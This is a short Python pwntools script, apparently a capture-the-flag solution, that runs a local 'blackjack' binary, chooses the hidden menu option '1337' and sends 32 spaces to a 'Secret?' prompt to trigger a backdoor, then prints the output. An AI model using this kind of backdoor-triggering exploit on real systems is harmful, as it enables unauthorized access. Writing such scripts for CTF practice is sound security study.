from pwn import *

r = process('./blackjack')

def backdoor(secret):
    r.sendlineafter('Exit', '1337')
    r.sendafter('Secret?', secret)

backdoor(' ' * 32)

print r.recvall(1)
